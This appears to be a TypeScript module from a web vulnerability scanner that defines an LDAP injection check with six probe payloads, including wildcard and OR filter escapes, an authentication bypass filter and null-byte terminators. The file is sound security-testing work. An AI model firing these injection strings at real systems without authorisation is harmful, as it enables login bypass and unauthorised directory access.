// LDAP injection active check family.
import type { PayloadVariant } from '../types';

export const META = {
  id: 'ldap-injection',
  family: 'ldap-injection' as const,
  name: 'LDAP Injection',
  description: 'Detects LDAP injection via filter escape and wildcard probes.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json'],
};

const LDAP_PROBES = [
  { value: '*', intent: 'Wildcard — match all LDAP entries', signals: ['ldap-bypass'] },
  { value: '*)(|(objectClass=*', intent: 'Classic LDAP OR injection with wildcard', signals: ['ldap-bypass'] },
  { value: '*)((|objectClass=*)', intent: 'LDAP filter injection variant', signals: ['ldap-bypass'] },
  { value: 'admin)(&(password=*)', intent: 'Authentication bypass via AND filter injection', signals: ['ldap-bypass'] },
  { value: '\\00', intent: 'Null byte termination for LDAP strings', signals: ['ldap-bypass'] },
  { value: 'x\x00', intent: 'Embedded null byte in LDAP input', signals: ['ldap-bypass'] },
];

export function variants(): PayloadVariant[] {
  return LDAP_PROBES.map((p, i) => ({ id: `ldap-${i+1}`, family: 'ldap-injection' as const, value: p.value, encoding: 'raw' as const, intent: p.intent, requiresOast: false, requiresBrowser: false, destructiveRisk: 'none' as const, expectedSignals: p.signals }));
}
